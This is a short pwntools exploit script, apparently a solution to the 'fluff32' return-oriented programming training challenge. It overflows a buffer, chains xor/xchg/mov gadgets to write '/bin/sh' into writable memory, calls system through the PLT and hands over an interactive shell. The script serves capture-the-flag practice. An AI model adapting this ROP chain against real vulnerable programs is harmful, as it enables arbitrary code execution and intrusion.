#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./fluff32')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
'''.format(**locals())

io = start()
io.recvuntil("> ")

def set_address(address):
    return (
        p32(0x08048671) + # : xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
        p32(0x0) +
        p32(0x080483e1) + # : pop ebx; ret;
        p32(address) +
        p32(0x0804867b) + # : xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
        p32(0x0) +
        p32(0x08048689) + # : xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
        p32(0x0)
    )

def set_value(val):
    return (
        p32(0x08048671) + # : xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;
        p32(0x0) +
        p32(0x080483e1) + # : pop ebx; ret;
        p32(val) +
        p32(0x0804867b) + # : xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;
        p32(0x0) +
        p32(0x08048693) + # : mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
        p32(0x0) * 2
    )

address = 0x804a044
payload = (
    b"A" * 44 +
    set_address(address) +
    set_value(u32("/bin")) +
    set_address(address + 4) +
    set_value(u32("/sh\x00")) +
    p32(exe.plt["system"]) +
    b"BBBB" +
    p32(address)
)

io.sendline(payload)
io.interactive()

